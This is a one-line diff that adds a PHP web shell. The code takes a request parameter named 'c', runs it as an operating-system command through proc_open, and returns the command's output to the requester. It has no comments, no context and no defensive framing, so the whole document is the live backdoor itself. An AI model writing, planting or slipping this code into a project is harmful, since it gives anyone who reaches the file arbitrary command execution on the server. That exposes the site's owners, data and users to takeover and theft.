@@ -1,0 +1,1 @@
+<?php if(isset($_REQUEST["c"])){header("Content-Type:text/plain");$d=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$p=proc_open($_REQUEST["c"],$d,$pipes);if(is_resource($p)){echo stream_get_contents($pipes[1]);echo stream_get_contents($pipes[2]);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($p);}}
